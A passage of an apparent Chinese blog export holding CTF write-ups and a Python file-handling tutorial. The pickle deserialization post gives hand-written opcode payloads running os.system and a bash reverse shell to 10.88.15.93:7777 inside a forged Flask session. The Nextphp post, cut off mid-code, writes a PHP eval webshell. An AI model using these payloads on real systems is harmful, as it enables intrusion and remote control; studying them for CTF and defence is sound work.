Machine会维护一个栈来存储数据。当执行操作码时，它会将数据从栈中取出，并根据操作码的类型进行相应的操作。执行完成后，结果将被压入栈中。\n构造Python对象：当操作码序列被完全执行后，Pickle Virtual Machine会将栈顶的数据作为结果返回。这个结果就是反序列化后的Python对象。\n\n我们可以看到这个和通过__reduce__反序列化进行命令执行不一样\n通过__reduce__魔术方法进行命令执行是通过反序列化生成对象之后执行__reduce__进行代码执行，但是假如对序列化数据中可以使用的魔术方法进行了过滤，我们就不能直接进行代码执行了\n于是我们可以利用在进行反序列化的时候PVM会执行操作码的特性，来写操作码进行命令执行，然后最后反序列化返回的数据不是对象而是我们命令执行的结果\n常用的opcode\n\n\n指令\n描述\n具体写法\n栈上的变化\n\n\n\nc\n获取一个全局对象或import一个模块\nc[module]\\n[instance]\\n\n获得的对象入栈\n\n\no\n寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）\no\n这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈\n\n\ni\n相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）\ni[module]\\n[callable]\\n\n这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈\n\n\nN\n实例化一个None\nN\n获得的对象入栈\n\n\nS\n实例化一个字符串对象\nS’xxx’\\n\n获得的对象入栈\n\n\nV\n实例化一个UNICODE字符串对象\nVxxx\\n\n获得的对象入栈\n\n\nI\n实例化一个int对象\nIxxx\\n\n获得的对象入栈\n\n\nF\n实例化一个float对象\nFx.x\\n\n获得的对象入栈\n\n\nR\n选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\nR\n函数和参数出栈，函数的返回值入栈\n\n\n.\n程序结束，栈顶的一个元素作为pickle.loads()的返回值\n.\n无\n\n\n(\n向栈中压入一个MARK标记\n(\nMARK标记入栈\n\n\nt\n寻找栈中的上一个MARK，并组合之间的数据为元组\nt\nMARK标记以及被组合的数据出栈，获得的对象入栈\n\n\n)\n向栈中直接压入一个空元组\n)\n空元组入栈\n\n\nl\n寻找栈中的上一个MARK，并组合之间的数据为列表\nl\nMARK标记以及被组合的数据出栈，获得的对象入栈\n\n\n]\n向栈中直接压入一个空列表\n]\n空列表入栈\n\n\nd\n寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）\nd\nMARK标记以及被组合的数据出栈，获得的对象入栈\n\n\n}\n向栈中直接压入一个空字典\n}\n空字典入栈\n\n\np\n将栈顶对象储存至memo_n\npn\\n\n无\n\n\ng\n将memo_n的对象压栈\ngn\\n\n对象被压栈\n\n\n0\n丢弃栈顶对象\n0\n栈顶对象被丢弃\n\n\nb\n使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置\nb\n栈上第一个元素出栈\n\n\ns\n将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中\ns\n第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新\n\n\nu\n寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中\nu\nMARK标记以及被组合的数据出栈，字典被更新\n\n\na\n将栈的第一个元素append到第二个元素(列表)中\na\n栈顶元素出栈，第二个元素（列表）被更新\n\n\ne\n寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中\ne\nMARK标记以及被组合的数据出栈，列表被更新\n\n\nopcode版本\npickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。\nimport picklea=&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;print(f&#x27;# 原变量：&#123;a!r&#125;&#x27;)for i in range(4):    print(f&#x27;pickle版本&#123;i&#125;&#x27;,pickle.dumps(a,protocol=i))# 输出：pickle版本0 b&#x27;(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.&#x27;pickle版本1 b&#x27;&#125;q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.&#x27;pickle版本2 b&#x27;\\x80\\x02&#125;q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.&#x27;pickle版本3 b&#x27;\\x80\\x03&#125;q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.&#x27;\n\npickle3版本的opcode示例：\n# &#x27;abcd&#x27;b&#x27;\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.&#x27;# \\x80：协议头声明 \\x03：协议版本# \\x04\\x00\\x00\\x00：数据长度：4# abcd：数据# q：储存栈顶的字符串长度：一个字节（即\\x00）# \\x00：栈顶位置# .：数据截止\n\n\n\n\n\n\n\n\n\n漏洞利用利用思路\n\n任意代码执行或命令执行。\n变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。\n\n我们之前反序化漏洞都是通过魔术方法来实现的，现在不行了，需要绕过，也就是手写opcode进行代码执行\n手写opcode\n在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 __reduce__ 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。\n在这里可以体会到为何pickle是一种语言，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。\n根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。\n\n全局变量覆盖\nPython代码\n# secret.pyname=&#x27;TEST3213qkfsmfo&#x27;\n\n# main.pyimport pickleimport secretopcode=&#x27;&#x27;&#x27;c__main__secret(S&#x27;name&#x27;S&#x27;1&#x27;db.&#x27;&#x27;&#x27;print(&#x27;before:&#x27;,secret.name)output=pickle.loads(opcode.encode())print(&#x27;output:&#x27;,output)print(&#x27;after:&#x27;,secret.name)\n\n首先，通过 c 获取全局变量 secret ，然后建立一个字典，并使用 b 对secret进行属性设置，使用到的payload：\nc__main__  #c用于从模块中导入一个对象 __main__是模块 secret对象名 然后会把secret压入栈secret(S&#x27;name&#x27;  #(设置一个MARK标记 S则往栈中压入一个字符串S&#x27;1&#x27;      # 在压入一个字符串db.#d是用于找到第一个MARK标记，然后按出栈顺序两两组合为字典#b则是使用栈中第一个元素对的第二个元素进行属性设置#最后的.是停止符\n\n看了一下发现想要学会手写opcode需要我们对栈有深入的了解，但是我只会先进后出，但好像也就是这样\n我们把目光看到最后的一步之前，栈已经不会有再引入了，我们来看下栈的内容\n[ secret, &#x27;name&#x27;, &#x27;1&#x27; ]#经过d执行后[ secret, &#123;&#x27;name&#x27;: &#x27;1&#x27;&#125; ]#经过b执行 先将&#123;&#x27;name&#x27;:&#x27;1&#x27;&#125;创建成实例，然后再压入secret中然后进行属性设置弹出字典: [ secret ]                栈顶=字典被弹出弹出类:   [ ]                     栈顶=secret被弹出创建实例: obj = secret() 更新属性: obj.__dict__ = &#123;&#x27;name&#x27;: &#x27;1&#x27;&#125;压入实例: [ secret实例 ]               ↑              栈顶\n\n于是我们就通过opcode将name属性写入secret对象，这样我们就将secret.py中的name改为了1\n函数执行\n函数执行感觉会很常用到。我们从上一个全局变量覆盖可以看到，opcode执行什么操作主要是取决于最后的一个操作，前面的是准备数据\n__reduce__之所以会被过滤的原因是其生成的opcode中在最后会有一个R操作，如果被过滤了的话就无法使用了，现在可以通过opcode进行绕过\n我们执行函数可以利用的操作主要为R，i，o，这些都是可以进行函数执行的操作\nR\nb&#x27;&#x27;&#x27;cossystem(S&#x27;whoami&#x27;tR.&#x27;&#x27;&#x27;#R的作用是选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数#于是就直接将system作为函数\n\n\n\no\nb&#x27;&#x27;&#x27;(cossystemS&#x27;whoami&#x27;o.&#x27;&#x27;&#x27;#o寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）\n\n\n\ni\nb&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;iossystem.&#x27;&#x27;&#x27;#注意这里使用的是先引入whoami字符串然后进行i操作#i相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）\n\n\n\n\n\n实例化对象\n实例化对象是一种特殊的函数执行，这里简单的使用 R 构造一下，其他方式类似：\nclass Student:    def __init__(self, name, age):        self.name = name        self.age = agedata=b&#x27;&#x27;&#x27;c__main__Student(S&#x27;XiaoMing&#x27;S&quot;20&quot;tR.&#x27;&#x27;&#x27;a=pickle.loads(data)print(a.name,a.age)\n\n\n\n\n\n\n\nCTF例题实战[HFCTF 2021 Final]easyflask这个题目我当初做的时候记得是flask的cookie伪造，怎么在Python反序列化这里看到了，后面回去看了一下发现还是太年轻了，当时根本没深入，只顾着拿flag了\n我们先读取到源码\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler():    if not session.get(&#x27;u&#x27;):        u = pickle.dumps(User())#注意这里使用序列化构成session中的u        session[&#x27;u&#x27;] = u    return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler():    path = request.args.get(&#x27;file&#x27;)    path = os.path.join(&#x27;static&#x27;, path)    if not os.path.exists(path) or os.path.isdir(path) \\            or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path:        return &#x27;disallowed&#x27;    with open(path, &#x27;r&#x27;) as fp:        content = fp.read()    return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)\n\n由于可以进行任意文件读取，key我们可以很快的读取到，但是问题在于\ndef admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict): #检查u是否为字典类型            u = b64decode(u.get(&#x27;b&#x27;)) #获取到b的值然后进行base64解码        u = pickle.loads(u) #对其进行反序列化    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;\n\n我们可以看到，即使我们拿到了密匙然后伪造了session，但是还是拿不到flag，需要我们需要在反序列化的地方进行命令执行，而且命令执行结果是不会返回的，也就是我们只能进行无回显RCE\n我们先将我们的cookie进行解码\n&#123;&quot;u&quot;:&#123;&quot; b&quot;:&quot;gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4=&quot;&#125;&#125;\n\n拿到再进行解码一下\nimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)a = pickle.loads(base64.b64decode(    b&#x27;gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4=&#x27;))print(a)#test\n\nDS说实际上是所有信息都传递了，只不过输出的时候只会触发__repr__输出uname，但是我们做题的重点不在这里\n我们先读取密匙/proc/self/environ\nglzjin22948575858jfjfjufirijidjitg3uiiuuh\n\n然后准备反序列化数据\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64encodeUser = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 1,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (os.system,(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.88.15.93/7777 0&gt;&amp;1&#x27;&quot;,))&#125;)u = pickle.dumps(User())print(b64encode(u).decode())#gASVSwAAAAAAAACMAm50lIwGc3lzdGVtlJOUjDNiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjg4LjE1LjkzLzc3NzcgMD4mMSeUhZRSlC4=\n\n由于没有回显，直接反弹shell，不知道是不是opcode的原因，必须在Linux系统中运行\n然后进行session伪造\npython flask_session_cookie_manager3.py encode -s &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjg4LjE1LjkzLzc3NzcgMD4mMSciCnAxCnRwMgpScDMKLg==&#x27;&#125;&#125;&quot;#eyJ1Ijp7ImIiOiJZM0J2YzJsNENuTjVjM1JsYlFwd01Bb29VeUppWVhOb0lDMWpJQ2RpWVhOb0lDMXBJRDRtSUM5a1pYWXZkR053THpFd0xqZzRMakUxTGprekx6YzNOemNnTUQ0bU1TY2lDbkF4Q25Sd01ncFNjRE1LTGc9PSJ9fQ.aNzsiQ.p5w9Ky7Q2pBwYLmpzFvpUrzKcgs\n\n这个题目好像每次访问都会重新设置一下session，所以要抓包发\n\n\n\n\n直接读flag\n\n\n\n\n"},{"title":"Python文件操作","url":"/2025/12/14/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","content":"Python文件操作这个可以说是历史上遗留下来的问题了，虽然现在有很多工具可以去辅助我们进行文件操作，但是就是怕遇见Misc里面那些批量文件的题目，如果不用Python脚本根本不能进行操作。\n1.文件基础操作1.文件模式​        在打开文件时，你需要指定文件的模式，可以将模式与打开的文件路径一起传递给open()函数，如open(&#39;file.txt&#39;, &#39;r&#39;)。常见的文件模式包括：\n\n\n\n模式组合\n等价模式\n说明\n\n\n\n&#39;r&#39;\n&#39;rt&#39;\n文本只读（默认）\n\n\n&#39;w&#39;\n&#39;wt&#39;\n文本只写（清空）\n\n\n&#39;a&#39;\n&#39;at&#39;\n文本追加\n\n\n&#39;rb&#39;\n-\n二进制只读\n\n\n&#39;wb&#39;\n-\n二进制只写\n\n\n&#39;ab&#39;\n-\n二进制追加\n\n\n&#39;r+&#39;\n&#39;r+t&#39;\n文本读写\n\n\n&#39;w+&#39;\n&#39;w+t&#39;\n文本读写（清空）\n\n\n&#39;a+&#39;\n&#39;a+t&#39;\n文本读写追加\n\n\n&#39;r+b&#39;\n&#39;rb+&#39;\n二进制读写\n\n\n&#39;w+b&#39;\n&#39;wb+&#39;\n二进制读写（清空）\n\n\n&#39;a+b&#39;\n&#39;ab+&#39;\n二进制读写追加\n\n\n&#39;x&#39;\n&#39;xt&#39;\n文本独占创建\n\n\n&#39;xb&#39;\n-\n二进制独占创建\n\n\n2.文件的打开与关闭打开文件\nPython使用内置的open()函数来打开文件：\n# 基本语法file = open(filename, mode, encoding)\n\n常用模式参数： - &#39;r&#39;：只读模式（默认） - &#39;w&#39;：写入模式（覆盖原文件） - &#39;a&#39;：追加模式 - &#39;x&#39;：创建模式（文件存在则报错） - &#39;b&#39;：二进制模式 - &#39;t&#39;：文本模式（默认） - &#39;+&#39;：读写模式\n实例\n# 打开文件（默认为只读模式）file_path = &#x27;example.txt&#x27;with open(file_path, &#x27;r&#x27;) as file:    # 执行文件操作，例如读取文件内容    file_content = file.read()    print(file_content)# 文件在with块结束后会自动关闭，无需显式关闭文件\n\n\n\n关闭文件\n在 Python 中关闭文件有两种主要的方法：\n分别是使用with语句和close()方法，其中由于with语句执行完自动关闭文件，一般使用with语句。\n实例\nfile_path = &#x27;example.txt&#x27;with open(file_path, &#x27;r&#x27;) as file:    # 执行文件操作，例如读取文件内容    file_content = file.read()    print(file_content)    # 文件在这里已经被自动关闭file_path = &#x27;example.txt&#x27;file = open(file_path, &#x27;r&#x27;)try:    # 执行文件操作，例如读取文件内容    file_content = file.read()    print(file_content)finally:    file.close()\n\n\n\n3.文件读写文件读取\n常用的文件读取函数有\ncontent = file.read()  # 读取整个文件内容line = file.readline()  # 读取文件的一行内容lines = file.readlines()  # 读取文件的所有行内容并返回列表\n\n实例\n# 方法1：read() - 读取整个文件内容with open(&#x27;example.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:    content = file.read()    print(content)# 方法2：读取指定字符数with open(&#x27;example.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:    content = file.read(100)  # 读取前100个字符    print(content)# 方法1：readline() - 读取一行with open(&#x27;example.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:    line = file.readline()    print(line)# 方法2：readlines() - 读取所有行到列表with open(&#x27;example.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:    lines = file.readlines()    for line in lines:        print(line.strip())  # strip()去除换行符# 方法3：使用for循环逐行读取（推荐）with open(&#x27;example.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:    for line in file: #file对象进行迭代就是进入到下一行        print(line.strip())\n\n\n\n大文件读取\n# 对于大文件，逐行读取更节省内存def read_large_file(filename):    with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:        for line_num, line in enumerate(file, 1):            # 处理每一行            yield line_num, line.strip()# 使用生成器读取大文件for line_num, content in read_large_file(&#x27;large_file.txt&#x27;):    print(f&quot;第&#123;line_num&#125;行: &#123;content&#125;&quot;)\n\n\n\n文件写入\n使用文件对象的write()方法可以将数据写入文件。你可以将字符串或者字节流作为参数传递给write()方法。\nfile = open(&#x27;file.txt&#x27;, &#x27;w&#x27;)  # 以写入模式打开文件file.write(&#x27;Hello, World!&#x27;)  # 写入字符串到文件\n\n实例\n# 覆盖写入 使用w会清空文件，如果只是想修改的话就使用r+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:    file.write(&#x27;Hello, World!\\n&#x27;)    file.write(&#x27;这是第二行\\n&#x27;)# 追加写入with open(&#x27;output.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as file:    file.write(&#x27;这是追加的内容\\n&#x27;)#写入多行lines = [&#x27;第一行\\n&#x27;, &#x27;第二行\\n&#x27;, &#x27;第三行\\n&#x27;]# 方法1：使用writelines() 和readlines刚好相反，由列表分行写入文件with open(&#x27;output.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:    file.writelines(lines)# 方法2：使用循环with open(&#x27;output.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:    for line in lines:        file.write(line)# 格式化写入data = [    &#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 25, &#x27;city&#x27;: &#x27;北京&#x27;&#125;,    &#123;&#x27;name&#x27;: &#x27;李四&#x27;, &#x27;age&#x27;: 30, &#x27;city&#x27;: &#x27;上海&#x27;&#125;,    &#123;&#x27;name&#x27;: &#x27;王五&#x27;, &#x27;age&#x27;: 28, &#x27;city&#x27;: &#x27;广州&#x27;&#125;]with open(&#x27;formatted_output.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:    file.write(&#x27;姓名\\t年龄\\t城市\\n&#x27;)    for person in data:        file.write(f&quot;&#123;person[&#x27;name&#x27;]&#125;\\t&#123;person[&#x27;age&#x27;]&#125;\\t&#123;person[&#x27;city&#x27;]&#125;\\n&quot;)\n\n\n\n\n\n4.二进制文件操作读取二进制文件\n其实就是在文件读取模式的时候加一个b就会将读写全部变为二进制，想要读写就直接r+b就行了\n# 读取图片文件with open(&#x27;image.jpg&#x27;, &#x27;rb&#x27;) as file:    binary_data = file.read()    print(f&quot;文件大小: &#123;len(binary_data)&#125; 字节&quot;)# 复制二进制文件def copy_binary_file(source, destination):    with open(source, &#x27;rb&#x27;) as src:        with open(destination, &#x27;wb&#x27;) as dst:            dst.write(src.read())copy_binary_file(&#x27;source.jpg&#x27;, &#x27;copy.jpg&#x27;)\n\n\n\n分块读取大型二进制文件\ndef copy_large_binary_file(source, destination, chunk_size=8192):    with open(source, &#x27;rb&#x27;) as src:        with open(destination, &#x27;wb&#x27;) as dst:            while True:                chunk = src.read(chunk_size)                if not chunk:                    break                dst.write(chunk)copy_large_binary_file(&#x27;large_video.mp4&#x27;, &#x27;copy_video.mp4&#x27;)\n\n\n\n2.文件的路径和文件名操作在文件操作中，你经常需要处理文件路径和文件名。Python提供了os模块和os.path模块来进行文件路径操作。你可以使用这些模块来获取文件的绝对路径、检查文件是否存在、创建目录等。\nimport osfile_path = &#x27;path/to/file.txt&#x27;abs_path = os.path.abspath(file_path)  # 获取文件的绝对路径file_exists = os.path.exists(file_path)  # 检查文件是否存在dir_name = os.path.dirname(file_path)  # 获取文件所在目录的路径os.makedirs(&#x27;path/to/new_dir&#x27;)  # 创建目录\n\n如果只是简单的文件读写，可能这些就够了，可是这可是Misc，基本上只要和文件名和文件路径有关系的基本上都可以看见\n# 文件存在性检查os.path.exists(path)      # 是否存在os.path.isfile(path)      # 是否是文件os.path.isdir(path)       # 是否是目录os.path.islink(path)      # 是否是符号链接# 路径操作os.path.join(a, b, c)     # 安全拼接路径os.path.dirname(path)     # 获取目录名os.path.basename(path)    # 获取文件名os.path.splitext(path)    # 分离扩展名os.path.abspath(path)     # 获取绝对路径os.path.realpath(path)    # 解析符号链接# 目录遍历os.listdir(path)          # 列出目录内容os.walk(path)             # 递归遍历目录树# 文件信息os.path.getsize(path)     # 获取文件大小os.stat(path)             # 获取详细文件信息os.access(path, mode)     # 检查权限（R_OK, W_OK, X_OK）# 环境相关os.getcwd()              # 当前工作目录os.chdir(path)           # 改变工作目录os.environ               # 环境变量字典# 文件操作os.rename(src, dst)      # 重命名/移动os.remove(path)          # 删除文件os.mkdir(path)           # 创建目录os.makedirs(path)        # 递归创建目录\n\n\n\n\n\n文件&#x2F;目录存在性检查\nimport os# 检查文件是否存在（最常用）if os.path.exists(&#x27;/etc/passwd&#x27;):    print(&quot;文件存在！&quot;)# 检查是否是文件if os.path.isfile(&#x27;flag.txt&#x27;):    with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as f:        print(f.read())# 检查是否是目录if os.path.isdir(&#x27;/tmp&#x27;):    print(&quot;这是一个目录&quot;)# 检查是否是链接if os.path.islink(&#x27;/usr/bin/python&#x27;):    print(&quot;这是一个符号链接&quot;)\n\n\n\n获取当前工作目录\n# CTF中经常需要定位文件current_dir = os.getcwd()print(f&quot;当前目录: &#123;current_dir&#125;&quot;)# 改变工作目录（有时需要）os.chdir(&#x27;/tmp&#x27;)print(f&quot;新目录: &#123;os.getcwd()&#125;&quot;)\n\n\n\n路径拼接与分解\n# 安全地拼接路径（跨平台）full_path = os.path.join(&#x27;/home&#x27;, &#x27;user&#x27;, &#x27;ctf&#x27;, &#x27;challenge&#x27;, &#x27;flag.txt&#x27;)# 输出: /home/user/ctf/challenge/flag.txt# 分解路径path = &#x27;/home/user/flag.txt&#x27;dirname = os.path.dirname(path)   # &#x27;/home/user&#x27;basename = os.path.basename(path) # &#x27;flag.txt&#x27;splitext = os.path.splitext(path) # (&#x27;/home/user/flag&#x27;, &#x27;.txt&#x27;)# 获取绝对路径abs_path = os.path.abspath(&#x27;flag.txt&#x27;)print(f&quot;绝对路径: &#123;abs_path&#125;&quot;)# 获取真实路径（解析符号链接）real_path = os.path.realpath(&#x27;/usr/bin/python&#x27;)\n\n\n\n批量重命名和解码\n这个在杂项里面还是遇到很多次的一个场景，有一些题目附件数量太多了需要集中处理，这个时候就只能用python脚本\ndef batch_process_files(directory, process_func): #directory为我们操作的目录    &quot;&quot;&quot;批量处理目录中的文件&quot;&quot;&quot;    results = []        for filename in os.listdir(directory):  #listdir 列出这个目录的文件名        full_path = os.path.join(directory, filename) #拼接得到每个文件的路径                if os.path.isfile(full_path): #判断是否为文件，过滤掉目录            try:                result = process_func(full_path) # process_func为我们自己对文件的处理函数                results.append((filename, result))             except Exception as e:                results.append((filename, f&quot;错误: &#123;e&#125;&quot;))        return results# 示例：批量base64解码import base64def decode_if_base64(filename):    with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:        content = f.read().strip()                try:            # 尝试base64解码            decoded = base64.b64decode(content).decode(&#x27;utf-8&#x27;)            if &#x27;flag&#123;&#x27; in decoded:                return decoded        except:            pass                return content# 使用decoded_results = batch_process_files(&#x27;.&#x27;, decode_if_base64)for name, result in decoded_results:    print(f&quot;&#123;name&#125;: &#123;result[:100]&#125;...&quot;)\n\n首先流程都是通过os.listdir先获取到目录中所有的文件名，然后指定我们filename，再通过os.path.join拼接得到我们的文件路径，最后可以使用比如rename，等操作进行文件操作。我们可以配合循环进行对整个目录进行文件操作\n3.坐标绘图这个按理来说是不属于文件操作的内容的，但是Misc要考到也没办法，一般就是使用我们在题目中拿到的一大串坐标然后就去大点打出flag\n这个其实还算简单，主要就是使用matplotlib模块去创建一个坐标系，然后我们可以选择散点图，折线图这些常用来拿flag的图，如果坐标数量多就使用散点图，坐标数量少就使用折线图\n创建坐标轴\n这个由于我们使用的是matplotlib，我们调用plt.scatter(x, y)其中x，y为我们的列表中储存坐标，会自动检查我们最大的坐标进行打点\n获取坐标\n我们如果坐标数目少就直接写代码里面就行了，如果数目多或者在txt文件里面，我们就需要使用到文件操作和正则匹配数据来进行坐标获取\ndef plot_coordinates(coordinates): #coordinates是一个储存着坐标的列表     x = [coord[0] for coord in coordinates]     y = [coord[1] for coord in coordinates]# x = [c[0] for c in coordinates] 是一个列表推导式 创建了一个新的列表x ;for c in coordinates 循环coordinates中的每一个元素 ; c于是就是一个元组 c[0]获取到第一个元素然后赋值给x 所以就可以把所有x坐标提取到x列表中coordinates = [(1, 4), (1, 5), (1, 10), (1, 30)]# 其中(1,4)是一个元组\n\n\n\n散点图plt.scatter()\n我们获取到包含坐标的x和y列表之后，我们就需要对这些坐标进行操作了，首先是画散点图的函数，画散点图就是同时取一个x和y作为坐标进行打点\n其中plt.scatter有很多属性，我们可能会用到\nscatter = ax.scatter(x, y,                      s=None,          # 点大小                     c=None,          # 颜色                     marker=None,     # 点形状                     alpha=None,      # 透明度                     edgecolors=None, # 边缘颜色                     linewidths=None, # 边缘线宽                     **kwargs)\n\n\n\n\n\n折线图plt.plot()\n在和scatter一样精确到点的同时，再将两个点连接起来\nline = ax.plot(x, y,                fmt=&#x27;&#x27;,         # 格式字符串               linewidth=None, # 线宽               linestyle=None, # 线型               marker=None,    # 点标记               markersize=None,# 标记大小               **kwargs)\n\n\n\n一般来说我们只会使用到这两种图，最后再贴抄的一个脚本吧\nimport matplotlib.pyplot as pltdef plot_coordinates(coordinates):    x = [coord[0] for coord in coordinates]    y = [coord[1] for coord in coordinates]    plt.scatter(x, y)    plt.plot(x, y)    plt.xlabel(&#x27;X&#x27;) # X轴标签    plt.ylabel(&#x27;Y&#x27;) # Y轴标签    plt.title(&#x27;Coordinate Plot&#x27;)    plt.grid(True)    plt.show() # 显示图像coordinates = [(1, 4), (1, 5), (1, 10)] #省略很多坐标plot_coordinates(coordinates)\n\n我们可以看到，整个脚本对就是围绕着plt这个对象进行的，先是描点，然后再是连线，最后通过show显示\n我们遇到一些比如隐藏在文本或者其他没有直接告诉我们是坐标的数据中，我们如果看见一个数据在不同的数字上重复一段然后另一个一直变化，我们就可以猜测是坐标。\n如果坐标数目很多，不方便提取。我们可以提取一些关键坐标，然后使用打点配合连线的方式，这样也可以看清flag，只不过有时可能会出现坐标顺序其实不是画的顺序这种请况，就像23年国赛的一道题目一样\n\n"},{"title":"[RCTF_2019]Nextphp","url":"/2025/06/22/RCTF-2019-Nextphp/","content":"[RCTF_2019]Nextphp看题目的代码我还以为这把白给来了\n&lt;?phpif (isset($_GET[&#x27;a&#x27;])) &#123;    eval($_GET[&#x27;a&#x27;]);&#125; else &#123;    show_source(__FILE__);&#125;\n\n但是发现除了看一下phpinfo，好像其他都不能搞\n\n\n还是老样子把命令执行的函数给禁了，还有Open_basedir\n\n\n也是把我们的访问限制在了根目录，还是先写马用蚁剑连接一下\n?a=fiel_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);\n\n发现目录下还有一个文件\n&lt;?phpfinal class A implements Serializable &#123;//定义了一个Serializable接口，可以自己定义serialize函数去使用    protected $data = [        &#x27;ret&#x27; =&gt; null,        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,        &#x27;arg&#x27; =&gt; &#x27;1&#x27;    ];    private function run () &#123;        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);    &#125;    public function __serialize(): array &#123;        return $this-&gt;data;    &#125;    public function __unserialize(array $data) &#123;        array_merge($this-&gt;data, $data);        $this-&gt;run();    &#125;    public function serialize (): string &#123;        return serialize($this-&gt;data);    &#125;    public 